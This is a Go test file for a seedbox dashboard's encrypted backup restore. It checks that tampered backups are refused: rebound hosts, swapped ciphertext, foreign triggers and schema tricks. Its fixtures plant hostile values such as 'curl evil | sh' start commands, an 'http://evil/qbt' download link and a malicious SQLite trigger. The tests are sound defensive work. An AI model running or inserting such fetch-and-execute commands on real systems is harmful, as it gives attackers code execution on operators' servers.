// pmss-fleet-manager — a single-pane dashboard for Pulsed Media seedboxes.
// Copyright (C) 2026 AlteredParadox
//
// This program is free software: you can redistribute it and/or modify it
// under the terms of the GNU Affero General Public License as published by
// the Free Software Foundation, either version 3 of the License, or (at your
// option) any later version.
//
// This program is distributed in the hope that it will be useful, but WITHOUT
// ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
// FITNESS FOR A PARTICULAR PURPOSE. See the GNU Affero General Public License
// for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program. If not, see <https://www.gnu.org/licenses/>.

package store

import (
	"context"
	"database/sql"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"pmss-fleet-manager/internal/secrets"
)

// rawCell reads one stored column of a box from the file, outside the store.
func rawCell(t *testing.T, path, col string, id int64) string {
	t.Helper()
	db, err := sql.Open("sqlite", "file:"+path+"?mode=ro")
	if err != nil {
		t.Fatal(err)
	}
	defer db.Close()
	var v string
	if err := db.QueryRow(`SELECT `+col+` FROM boxes WHERE id=?`, id).Scan(&v); err != nil {
		t.Fatal(err)
	}
	return v
}

// boundBackup is an encrypted backup of a store holding two password
// boxes, with their IDs.
func boundBackup(t *testing.T, dir string) (backup string, a, b int64) {
	t.Helper()
	ctx := context.Background()
	src := filepath.Join(dir, "src.db")
	s, err := Open(src, WithSealer(mustSealer(t, backupKeyA)))
	if err != nil {
		t.Fatal(err)
	}
	ba := &Box{Name: "a", Host: "odin.example", User: "ragnar", Password: "pw-a", QbtPass: "qp-a", QbtStartCmd: "start-a", Enabled: true}
	bb := &Box{Name: "b", Host: "thor.example", User: "bjorn", Password: "pw-b", Enabled: true}
	for _, x := range []*Box{ba, bb} {
		if err := s.CreateBox(ctx, x); err != nil {
			t.Fatal(err)
		}
	}
	s.Close()
	backup = filepath.Join(dir, "backup.db")
	if _, err := Backup(ctx, src, backup); err != nil {
		t.Fatal(err)
	}
	return backup, ba.ID, bb.ID
}

// The Codex audit of 1.23.0 (restore-sealed-credential-endpoint-
// rebinding): someone who can edit a backup but not decrypt it points a
// box at their own server, or moves a box's ciphertext onto a box they
// pointed there. The credential no longer opens, so the restore is
// refused before the live database is replaced, and a copy restored
// without the check does not start (or, forgetting, drops it).
func TestRestoreRefusesReboundCredentials(t *testing.T) {
	ctx := context.Background()
	sealA := WithSealer(mustSealer(t, backupKeyA))
	for name, tamper := range map[string]func(t *testing.T, path string, a, b int64){
		"host": func(t *testing.T, p string, a, _ int64) {
			rawExec(t, p, `UPDATE boxes SET host='127.0.0.1', host_key='' WHERE id=?`, a)
		},
		"host case": func(t *testing.T, p string, a, _ int64) {
			rawExec(t, p, `UPDATE boxes SET host='ODIN.example' WHERE id=?`, a)
		},
		"port": func(t *testing.T, p string, a, _ int64) { rawExec(t, p, `UPDATE boxes SET port=2222 WHERE id=?`, a) },
		"user": func(t *testing.T, p string, a, _ int64) {
			rawExec(t, p, `UPDATE boxes SET user='mallory' WHERE id=?`, a)
		},
		"WebUI password": func(t *testing.T, p string, a, b int64) {
			rawExec(t, p, `UPDATE boxes SET qbt_pass=(SELECT qbt_pass FROM boxes WHERE id=?) WHERE id=?`, a, b)
		},
		"start command": func(t *testing.T, p string, a, b int64) {
			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd=(SELECT qbt_start_cmd FROM boxes WHERE id=?) WHERE id=?`, a, b)
		},
		"row swap": func(t *testing.T, p string, a, b int64) {
			rawExec(t, p, `UPDATE boxes SET password=(SELECT password FROM boxes WHERE id=?) WHERE id=?`, a, b)
		},
		"id swap": func(t *testing.T, p string, a, b int64) {
			rawExec(t, p, `UPDATE boxes SET id=id+100`)
			rawExec(t, p, `UPDATE boxes SET id=? WHERE id=?`, b, a+100)
			rawExec(t, p, `UPDATE boxes SET id=? WHERE id=?`, a, b+100)
		},
	} {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			backup, a, b := boundBackup(t, dir)
			before := rawCell(t, backup, "password", a)
			tamper(t, backup, a, b)
			if name != "row swap" && name != "id swap" && rawCell(t, backup, "password", a) != before {
				t.Fatal("the tamper changed the ciphertext")
			}
			live := filepath.Join(dir, "data", "pmss-fleet-manager.db")
			liveStore(t, live, "current", sealA).Close()
			if _, err := Restore(ctx, live, backup, true, sealA); !errors.Is(err, secrets.ErrWrongKey) {
				t.Fatalf("tampered restore: %v", err)
			}
			if got := boxNames(t, live, sealA); len(got) != 1 || got[0] != "current/pw-current" {
				t.Fatalf("a refused restore changed the database: %v", got)
			}
			// Without the check, the dashboard refuses to start on it; the
			// start that forgets keeps nothing the tamper touched.
			fresh := filepath.Join(dir, "fresh", "pmss-fleet-manager.db")
			if _, err := Restore(ctx, fresh, backup, false); err != nil {
				t.Fatal(err)
			}
			if _, err := Open(fresh, sealA); !errors.Is(err, secrets.ErrWrongKey) {
				t.Fatalf("start on the tampered copy: %v", err)
			}
			s, err := Open(fresh, sealA, WithForgetUnreadable())
			if err != nil {
				t.Fatal(err)
			}
			defer s.Close()
			if s.ForgottenOnOpen() == 0 {
				t.Fatal("nothing forgotten")
			}
		})
	}
}

// The untouched backup restores, and each credential still opens.
func TestRestoreBoundCredentials(t *testing.T) {
	ctx := context.Background()
	dir := t.TempDir()
	sealA := WithSealer(mustSealer(t, backupKeyA))
	backup, a, _ := boundBackup(t, dir)
	if v, _ := secrets.Envelope(rawCell(t, backup, "password", a)); v != 2 {
		t.Fatalf("stored as envelope v%d", v)
	}
	live := filepath.Join(dir, "data", "pmss-fleet-manager.db")
	if _, err := Restore(ctx, live, backup, true, sealA); err != nil {
		t.Fatal(err)
	}
	s, err := Open(live, sealA)
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	got, err := s.GetBox(ctx, a)
	if err != nil || got.Password != "pw-a" || got.QbtPass != "qp-a" || got.QbtStartCmd != "start-a" {
		t.Fatalf("%+v %v", got, err)
	}
}

// unboundFixture is a backup as 1.23 wrote it: the box's credentials in
// envelope version 1, sealed to their column only.
func unboundFixture(t *testing.T, dir string) (backup string, id int64) {
	t.Helper()
	backup, id, _ = boundBackup(t, dir)
	sl := mustSealer(t, backupKeyA)
	rawExec(t, backup, `UPDATE boxes SET password=?, qbt_pass=?, qbt_start_cmd=? WHERE id=?`,
		sl.Seal(labelPassword, "pw-a"), sl.Seal(labelQbtPass, "qp-a"), sl.Seal(labelQbtStartCmd, "start-a"), id)
	return backup, id
}

// A backup from before binding is refused unless the operator says what
// to do with its credentials, with or without the secret check (the scan
// needs no secret); keep binds them as the file names the box, drop
// clears them before anything opens the copy.
func TestRestoreUnboundCredentials(t *testing.T) {
	ctx := context.Background()
	sealA := WithSealer(mustSealer(t, backupKeyA))
	dir := t.TempDir()
	backup, id := unboundFixture(t, dir)
	if sum, err := Inspect(ctx, backup); err != nil || sum.Unbound != 3 {
		t.Fatalf("inspect: %+v %v", sum, err)
	}
	live := filepath.Join(dir, "data", "pmss-fleet-manager.db")
	for _, verify := range []bool{true, false} {
		if _, err := Restore(ctx, live, backup, verify, sealA); !errors.Is(err, ErrOldCredentials) {
			t.Fatalf("verify=%v: %v", verify, err)
		}
		if _, err := Restore(ctx, live, backup, verify, sealA, WithOldCredentials(RefuseOldCredentials)); !errors.Is(err, ErrOldCredentials) {
			t.Fatalf("verify=%v explicit refuse: %v", verify, err)
		}
	}

	res, err := Restore(ctx, live, backup, true, sealA, WithOldCredentials(KeepOldCredentials))
	if err != nil || res.Unbound != 0 {
		t.Fatalf("keep: %+v %v", res, err)
	}
	for _, col := range []string{"password", "qbt_pass", "qbt_start_cmd"} {
		if v, _ := secrets.Envelope(rawCell(t, live, col, id)); v != 2 {
			t.Fatalf("kept %s left in envelope v%d", col, v)
		}
	}
	if got := boxNames(t, live, sealA); len(got) != 2 || got[0] != "a/pw-a" {
		t.Fatalf("kept %v", got)
	}

	fresh := filepath.Join(dir, "fresh", "pmss-fleet-manager.db")
	if _, err := Restore(ctx, fresh, backup, false, WithOldCredentials(DropOldCredentials)); err != nil {
		t.Fatal(err)
	}
	for _, col := range []string{"password", "qbt_pass", "qbt_start_cmd"} {
		if v := rawCell(t, fresh, col, id); v != "" {
			t.Fatalf("dropped %s holds %q", col, v)
		}
	}
	if got := boxNames(t, fresh, sealA); len(got) != 2 || got[0] != "a/" || got[1] != "b/pw-b" {
		t.Fatalf("after drop %v", got)
	}
}

// A live database from 1.23 opens as before: its unbound credentials
// are bound in place (and the old bytes scrubbed), and a tamper of the
// live file afterwards no longer opens.
func TestOpenBindsUnboundCredentials(t *testing.T) {
	ctx := context.Background()
	sealA := WithSealer(mustSealer(t, backupKeyA))
	dir := t.TempDir()
	path, id := unboundFixture(t, dir)
	s, err := Open(path, sealA)
	if err != nil {
		t.Fatal(err)
	}
	if s.ResealedOnOpen() != 3 {
		t.Fatalf("resealed %d", s.ResealedOnOpen())
	}
	if v, _ := s.GetValue(ctx, cleanupKey); v != "0" {
		t.Fatalf("cleanup %q", v)
	}
	got, err := s.GetBox(ctx, id)
	if err != nil || got.Password != "pw-a" || got.QbtPass != "qp-a" || got.QbtStartCmd != "start-a" {
		t.Fatalf("%+v %v", got, err)
	}
	s.Close()
	rawExec(t, path, `UPDATE boxes SET host='127.0.0.1' WHERE id=?`, id)
	if _, err := Open(path, sealA); !errors.Is(err, secrets.ErrWrongKey) {
		t.Fatalf("tampered live file: %v", err)
	}
}

// An edit that moves a box keeps its saved credentials, sealed again for
// the new endpoint; one that does not move it leaves their bytes alone.
func TestUpdateBoxRebindsKeptCredentials(t *testing.T) {
	ctx := context.Background()
	path := filepath.Join(t.TempDir(), "test.db")
	s, err := Open(path, WithSealer(mustSealer(t, backupKeyA)))
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	b := &Box{Name: "a", Host: "odin.example", User: "ragnar", Password: "pw", QbtPass: "qp", Enabled: true}
	if err := s.CreateBox(ctx, b); err != nil {
		t.Fatal(err)
	}
	pw0, qp0, _ := rawSecrets(t, s, b.ID)

	b.Password, b.QbtPass, b.Name = "", "", "renamed"
	if err := s.UpdateBox(ctx, b, Clears{}); err != nil {
		t.Fatal(err)
	}
	if pw, qp, _ := rawSecrets(t, s, b.ID); pw != pw0 || qp != qp0 {
		t.Fatal("an edit that kept the endpoint rewrote the credentials")
	}

	for i, move := range []func(*Box){
		func(x *Box) { x.Host = "thor.example" },
		func(x *Box) { x.Port = 2222 },
		func(x *Box) { x.User = "bjorn" },
	} {
		move(b)
		b.Password, b.QbtPass = "", ""
		if err := s.UpdateBox(ctx, b, Clears{ReplaceHostKey: true}); err != nil {
			t.Fatalf("move %d: %v", i, err)
		}
		pw, qp, _ := rawSecrets(t, s, b.ID)
		if pw == pw0 || qp == qp0 {
			t.Fatalf("move %d kept the old binding", i)
		}
		pw0, qp0 = pw, qp
		got, err := s.GetBox(ctx, b.ID)
		if err != nil || got.Password != "pw" || got.QbtPass != "qp" {
			t.Fatalf("move %d: %+v %v", i, got, err)
		}
		b.Revision = got.Revision
	}

	// A stale edit is refused before anything is decrypted or written.
	b.Revision--
	b.Host = "loki.example"
	if err := s.UpdateBox(ctx, b, Clears{}); !errors.Is(err, ErrStale) {
		t.Fatalf("stale: %v", err)
	}
	if err := s.UpdateBox(ctx, &Box{ID: 999, Host: "x", User: "y"}, Clears{}); !errors.Is(err, ErrNotFound) {
		t.Fatalf("missing: %v", err)
	}
}

// Without a secret nothing changes: credentials stay plain text through
// an edit that moves the box.
func TestUpdateBoxPlainStoreMove(t *testing.T) {
	ctx := context.Background()
	s, err := Open(filepath.Join(t.TempDir(), "test.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	b := &Box{Name: "a", Host: "odin.example", User: "ragnar", Password: "pw", Enabled: true}
	if err := s.CreateBox(ctx, b); err != nil {
		t.Fatal(err)
	}
	b.Password, b.Host = "", "thor.example"
	if err := s.UpdateBox(ctx, b, Clears{}); err != nil {
		t.Fatal(err)
	}
	if pw, _, _ := rawSecrets(t, s, b.ID); pw != "pw" {
		t.Fatalf("stored %q", pw)
	}
}

// A plain-text password that only looks like the old envelope is a
// password: the scan leaves it to the marker, and drop does not touch it.
func TestRestorePlainPasswordShapedLikeEnvelope(t *testing.T) {
	ctx := context.Background()
	dir := t.TempDir()
	src := filepath.Join(dir, "src.db")
	s, err := Open(src)
	if err != nil {
		t.Fatal(err)
	}
	if err := s.CreateBox(ctx, &Box{Name: "a", Host: "odin.example", User: "ragnar", Password: "pmss1:hunter2", Enabled: true}); err != nil {
		t.Fatal(err)
	}
	s.Close()
	backup := filepath.Join(dir, "backup.db")
	if _, err := Backup(ctx, src, backup); err != nil {
		t.Fatal(err)
	}
	live := filepath.Join(dir, "data", "pmss-fleet-manager.db")
	if _, err := Restore(ctx, live, backup, true); err != nil {
		t.Fatal(err)
	}
	if got := boxNames(t, live); len(got) != 1 || got[0] != "a/pmss1:hunter2" {
		t.Fatalf("restored %v", got)
	}
}

// Stripping every encryption row as well as moving the box makes the file
// look like one from before encryption support: its ciphertext still has
// to open, bound, and does not.
func TestRestoreReboundWithoutMarkers(t *testing.T) {
	ctx := context.Background()
	dir := t.TempDir()
	sealA := WithSealer(mustSealer(t, backupKeyA))
	backup, a, _ := boundBackup(t, dir)
	rawExec(t, backup, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
	rawExec(t, backup, `UPDATE boxes SET host='127.0.0.1', host_key='' WHERE id=?`, a)
	live := filepath.Join(dir, "data", "pmss-fleet-manager.db")
	if _, err := Restore(ctx, live, backup, true, sealA); !errors.Is(err, secrets.ErrWrongKey) {
		t.Fatalf("restore: %v", err)
	}
}

// A secret change while a credential is still unbound: the previous
// secret opens it by its label, and it is stored bound under the new one.
func TestRotationBindsUnboundCredentials(t *testing.T) {
	ctx := context.Background()
	dir := t.TempDir()
	path, id := unboundFixture(t, dir)
	s, err := Open(path, WithSealer(mustSealer(t, backupKeyB)), WithPreviousSealer(mustSealer(t, backupKeyA)))
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	got, err := s.GetBox(ctx, id)
	if err != nil || got.Password != "pw-a" || got.QbtPass != "qp-a" {
		t.Fatalf("%+v %v", got, err)
	}
	if v, _ := secrets.Envelope(rawCell(t, path, "password", id)); v != 2 {
		t.Fatalf("stored as envelope v%d", v)
	}
}

// Someone without the secret cannot forge an encrypted value, but could
// write plain text in its place, which the dashboard would otherwise take
// as left by a build without the secret and seal. In an encrypted backup
// (markers intact or stripped) and under a configured secret, that is
// refused, with or without the secret check; an emptied value (the
// default start or build) is not plain text.
func TestRestoreRefusesPlaintextInEncryptedBackup(t *testing.T) {
	ctx := context.Background()
	sealA := WithSealer(mustSealer(t, backupKeyA))
	for name, tc := range map[string]struct {
		tamper func(t *testing.T, path string, a int64)
		opts   []Option
		verify bool
	}{
		"start command": {func(t *testing.T, p string, a int64) {
			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='curl evil | sh' WHERE id=?`, a)
		}, []Option{sealA}, true},
		"download link": {func(t *testing.T, p string, _ int64) {
			rawExec(t, p, `INSERT OR REPLACE INTO settings(key, value) VALUES('qbt_download_url', 'http://evil/qbt')`)
		}, []Option{sealA}, true},
		"password, unchecked, no secret": {func(t *testing.T, p string, a int64) {
			rawExec(t, p, `UPDATE boxes SET password='typed' WHERE id=?`, a)
		}, nil, false},
		"markers stripped": {func(t *testing.T, p string, a int64) {
			rawExec(t, p, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='curl evil | sh' WHERE id=?`, a)
		}, []Option{sealA}, true},
		"markers stripped, unchecked, no secret": {func(t *testing.T, p string, a int64) {
			rawExec(t, p, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='curl evil | sh' WHERE id=?`, a)
		}, nil, false},
		"v1-shaped payload, stripped": {func(t *testing.T, p string, a int64) {
			rawExec(t, p, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='pmss1:;curl evil | sh' WHERE id=?`, a)
		}, []Option{sealA}, true},
		"v3-shaped payload, stripped": {func(t *testing.T, p string, a int64) {
			rawExec(t, p, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='pmss3:;curl evil | sh' WHERE id=?`, a)
		}, []Option{sealA}, true},
		"v2-shaped payload, stripped": {func(t *testing.T, p string, a int64) {
			rawExec(t, p, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='pmss2:;curl evil | sh' WHERE id=?`, a)
		}, []Option{sealA}, true},
		"v1-shaped payload, marked plain": {func(t *testing.T, p string, a int64) {
			rawExec(t, p, `DELETE FROM settings WHERE key='secrets_check'`)
			rawExec(t, p, `UPDATE settings SET value='0' WHERE key='secrets_sealed'`)
			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='pmss1:;curl evil | sh' WHERE id=?`, a)
		}, []Option{sealA}, true},
		"v3-shaped payload, marked plain": {func(t *testing.T, p string, a int64) {
			rawExec(t, p, `DELETE FROM settings WHERE key='secrets_check'`)
			rawExec(t, p, `UPDATE settings SET value='0' WHERE key='secrets_sealed'`)
			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='pmss3:;curl evil | sh' WHERE id=?`, a)
		}, []Option{sealA}, true},
		"v2-shaped payload, marked plain": {func(t *testing.T, p string, a int64) {
			rawExec(t, p, `DELETE FROM settings WHERE key='secrets_check'`)
			rawExec(t, p, `UPDATE settings SET value='0' WHERE key='secrets_sealed'`)
			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='pmss2:;curl evil | sh' WHERE id=?`, a)
		}, []Option{sealA}, true},
		"v2 in a setting": {func(t *testing.T, p string, _ int64) {
			rawExec(t, p, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
			rawExec(t, p, `INSERT OR REPLACE INTO settings(key, value) VALUES('qbt_download_url', ?)`, mustSealer(t, backupKeyA).SealBound(labelQbtDownloadURL, "", "http://x"))
		}, nil, false},
		"everything stripped, secret configured": {func(t *testing.T, p string, a int64) {
			rawExec(t, p, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
			rawExec(t, p, `UPDATE boxes SET password='', qbt_pass='', qbt_start_cmd=''`)
			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='curl evil | sh' WHERE id=?`, a)
		}, []Option{sealA}, true},
	} {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			backup, a, _ := boundBackup(t, dir)
			tc.tamper(t, backup, a)
			live := filepath.Join(dir, "data", "pmss-fleet-manager.db")
			if _, err := Restore(ctx, live, backup, tc.verify, tc.opts...); !errors.Is(err, ErrPlainCredentials) {
				t.Fatalf("restore: %v", err)
			}
			if _, err := Restore(ctx, live, backup, tc.verify, append(tc.opts, WithPlainCredentials())...); err != nil {
				t.Fatalf("accepted: %v", err)
			}
		})
	}
	// Emptied: the defaults, nothing to refuse.
	dir := t.TempDir()
	backup, a, _ := boundBackup(t, dir)
	rawExec(t, backup, `UPDATE boxes SET qbt_start_cmd='' WHERE id=?`, a)
	if _, err := Restore(ctx, filepath.Join(dir, "data", "pmss-fleet-manager.db"), backup, true, sealA); err != nil {
		t.Fatalf("emptied: %v", err)
	}
}

// A trigger (or view) in a backup would run during the restore's own
// writes, after the credential checks (fred on #222): one that rewrites a
// start command when the open re-encrypts it, say. The file is refused
// before anything writes to it, whatever the flags, and the live
// database is kept.
func TestRestoreRefusesForeignSchema(t *testing.T) {
	ctx := context.Background()
	sealA := WithSealer(mustSealer(t, backupKeyA))
	for name, ddl := range map[string]string{
		"trigger": `CREATE TRIGGER evil AFTER UPDATE ON boxes BEGIN UPDATE boxes SET qbt_start_cmd='curl evil | sh' WHERE id=NEW.id; END`,
		"view":    `CREATE VIEW v AS SELECT id FROM boxes`,
		// A virtual table and the shadow tables its module creates.
		"virtual": `CREATE VIRTUAL TABLE notes USING fts5(body)`,
		// Another spelling (SQLite stores the statement normalized, so
		// this guards the parse, not a text match).
		"virtual, odd spelling": `create /* x */ virtual table notes2 using fts5(body)`,
	} {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			backup, _ := unboundFixture(t, dir)
			rawExec(t, backup, ddl)
			live := filepath.Join(dir, "data", "pmss-fleet-manager.db")
			liveStore(t, live, "current", sealA).Close()
			for _, run := range []struct {
				verify bool
				opts   []Option
			}{
				{true, []Option{sealA, WithOldCredentials(KeepOldCredentials)}},
				{false, []Option{WithOldCredentials(DropOldCredentials)}},
				{true, []Option{sealA, WithOldCredentials(KeepOldCredentials), WithPlainCredentials()}},
			} {
				if _, err := Restore(ctx, live, backup, run.verify, run.opts...); !errors.Is(err, ErrForeignSchema) {
					t.Fatalf("verify=%v: %v", run.verify, err)
				}
			}
			if got := boxNames(t, live, sealA); len(got) != 1 || got[0] != "current/pw-current" {
				t.Fatalf("a refused restore changed the database: %v", got)
			}
		})
	}
}

// Codex on #222: ordinary tables can carry write side effects too. The
// backup keeps the genuine start-command ciphertext, copies it into the
// settings row a migration deletes, and gives boxes a foreign key on
// (helper, qbt_start_cmd) to settings(key, value) with ON DELETE SET
// DEFAULT and the attacker's command as the column's default: the
// migration's DELETE would write the command, and Open would seal it.
// Restore installs this build's schema with the backup's rows instead,
// so nothing of the file's schema runs or survives.
func TestRestoreRebuildsSchema(t *testing.T) {
	ctx := context.Background()
	sealA := WithSealer(mustSealer(t, backupKeyA))
	dir := t.TempDir()
	backup, a, _ := boundBackup(t, dir)
	db, err := sql.Open("sqlite", "file:"+backup)
	if err != nil {
		t.Fatal(err)
	}
	db.SetMaxOpenConns(1)
	var create string
	if err := db.QueryRow(`SELECT sql FROM sqlite_master WHERE name='boxes'`).Scan(&create); err != nil {
		t.Fatal(err)
	}
	evil := strings.Replace(create, "qbt_start_cmd TEXT NOT NULL DEFAULT ''", "qbt_start_cmd TEXT NOT NULL DEFAULT 'curl evil | sh'", 1)
	if evil == create {
		t.Fatal("fixture: column definition not found")
	}
	evil = strings.TrimSuffix(strings.TrimSpace(evil), ")") + ", helper TEXT, FOREIGN KEY (helper, qbt_start_cmd) REFERENCES settings(key, value) ON DELETE SET DEFAULT)"
	for _, q := range []string{
		`PRAGMA foreign_keys=OFF`,
		`PRAGMA legacy_alter_table=ON`,
		`ALTER TABLE boxes RENAME TO boxes_old`,
		evil,
		`INSERT INTO boxes SELECT *, NULL FROM boxes_old`,
		`DROP TABLE boxes_old`,
		`CREATE UNIQUE INDEX settings_kv ON settings(key, value)`,
		`INSERT INTO settings(key, value) SELECT 'pmdb_upload_key', qbt_start_cmd FROM boxes WHERE id=` + fmt.Sprint(a),
		`UPDATE boxes SET helper='pmdb_upload_key' WHERE id=` + fmt.Sprint(a),
	} {
		if _, err := db.Exec(q); err != nil {
			t.Fatalf("%s: %v", q, err)
		}
	}
	db.Close()
	live := filepath.Join(dir, "data", "pmss-fleet-manager.db")
	if _, err := Restore(ctx, live, backup, true, sealA); err != nil {
		t.Fatalf("restore: %v", err)
	}
	s, err := Open(live, sealA)
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	got, err := s.GetBox(ctx, a)
	if err != nil || got.QbtStartCmd != "start-a" {
		t.Fatalf("start command %q %v", got.QbtStartCmd, err)
	}
	var fks, extra int
	if err := s.db.QueryRow(`SELECT count(*) FROM pragma_foreign_key_list('boxes')`).Scan(&fks); err != nil || fks != 0 {
		t.Fatalf("boxes kept %d foreign keys (%v)", fks, err)
	}
	if err := s.db.QueryRow(`SELECT count(*) FROM pragma_table_info('boxes') WHERE name='helper'`).Scan(&extra); err != nil || extra != 0 {
		t.Fatalf("boxes kept the helper column (%v)", err)
	}
	if err := s.db.QueryRow(`SELECT count(*) FROM sqlite_master WHERE name='settings_kv'`).Scan(&extra); err != nil || extra != 0 {
		t.Fatalf("the backup's index survived (%v)", err)
	}
}

// A backup from an older version lacks columns added since: the rebuild
// gives them this build's defaults. The AUTOINCREMENT counter comes along,
// so a deleted box's ID is not handed out again.
func TestRestoreRebuildOlderSchema(t *testing.T) {
	ctx := context.Background()
	sealA := WithSealer(mustSealer(t, backupKeyA))
	dir := t.TempDir()
	backup, a, b := boundBackup(t, dir)
	rawExec(t, backup, `DELETE FROM boxes WHERE id=?`, b)
	rawExec(t, backup, `ALTER TABLE boxes DROP COLUMN listener_only`)
	rawExec(t, backup, `ALTER TABLE boxes DROP COLUMN cpu_weight`)
	live := filepath.Join(dir, "data", "pmss-fleet-manager.db")
	if _, err := Restore(ctx, live, backup, true, sealA); err != nil {
		t.Fatal(err)
	}
	s, err := Open(live, sealA)
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	got, err := s.GetBox(ctx, a)
	if err != nil || got.Password != "pw-a" || got.ListenerOnly || got.CPUWeight != 0 {
		t.Fatalf("%+v %v", got, err)
	}
	nb := &Box{Name: "c", Host: "h", User: "u", Enabled: true}
	if err := s.CreateBox(ctx, nb); err != nil {
		t.Fatal(err)
	}
	if nb.ID <= b {
		t.Fatalf("new box got ID %d, the deleted one had %d", nb.ID, b)
	}
}

// The rebuilt file is owner-only from the start: an unchecked restore of a
// plain-text backup installs it as it is (Codex and fred on #222).
func TestRestoreRebuildOwnerOnly(t *testing.T) {
	ctx := context.Background()
	dir := t.TempDir()
	src := filepath.Join(dir, "src.db")
	liveStore(t, src, "plain").Close()
	backup := filepath.Join(dir, "backup.db")
	if _, err := Backup(ctx, src, backup); err != nil {
		t.Fatal(err)
	}
	data := filepath.Join(dir, "data")
	if err := os.MkdirAll(data, 0o755); err != nil {
		t.Fatal(err)
	}
	live := filepath.Join(data, "pmss-fleet-manager.db")
	if _, err := Restore(ctx, live, backup, false); err != nil {
		t.Fatal(err)
	}
	if fi, err := os.Stat(live); err != nil || fi.Mode().Perm() != 0o600 {
		t.Fatalf("installed mode %v %v", fi.Mode(), err)
	}
}

// Counters of tables the backup holds no rows of any more still come
// along (fred on #222), and an old backup's duplicate active alerts are
// collapsed onto the oldest, as the migration did (Codex on #222).
func TestRestoreRebuildCountersAndAlerts(t *testing.T) {
	ctx := context.Background()
	sealA := WithSealer(mustSealer(t, backupKeyA))
	dir := t.TempDir()
	backup, a, b := boundBackup(t, dir)
	rawExec(t, backup, `DROP INDEX alerts_active_unique`)
	for i := range 2 {
		rawExec(t, backup, `INSERT INTO alerts(box_id, key, severity, title, active, created_at, updated_at) VALUES(?, 'disk', 'warn', ?, 1, 'x', 'x')`, a, fmt.Sprint("dup ", i))
	}
	rawExec(t, backup, `DELETE FROM boxes WHERE id=?`, b)
	live := filepath.Join(dir, "data", "pmss-fleet-manager.db")
	if _, err := Restore(ctx, live, backup, true, sealA); err != nil {
		t.Fatal(err)
	}
	s, err := Open(live, sealA)
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	var n int
	var title string
	if err := s.db.QueryRow(`SELECT count(*), min(title) FROM alerts WHERE box_id=? AND key='disk' AND active=1`, a).Scan(&n, &title); err != nil || n != 1 || title != "dup 0" {
		t.Fatalf("alerts: %d %q %v", n, title, err)
	}
	// Every box deleted: the table is copied empty, its counter is not lost.
	// (SQLite already opens a counter row on an INSERT ... SELECT of no
	// rows, which the update then raises; rebuild also inserts missing
	// ones, so this holds either way.)
	dir2 := t.TempDir()
	backup2, _, b2 := boundBackup(t, dir2)
	rawExec(t, backup2, `DELETE FROM boxes`)
	live2 := filepath.Join(dir2, "data", "pmss-fleet-manager.db")
	if _, err := Restore(ctx, live2, backup2, true, sealA); err != nil {
		t.Fatal(err)
	}
	s2, err := Open(live2, sealA)
	if err != nil {
		t.Fatal(err)
	}
	defer s2.Close()
	nb := &Box{Name: "c", Host: "h", User: "u", Enabled: true}
	if err := s2.CreateBox(ctx, nb); err != nil {
		t.Fatal(err)
	}
	if nb.ID <= b2 {
		t.Fatalf("new box got ID %d, the deleted ones went up to %d", nb.ID, b2)
	}
}
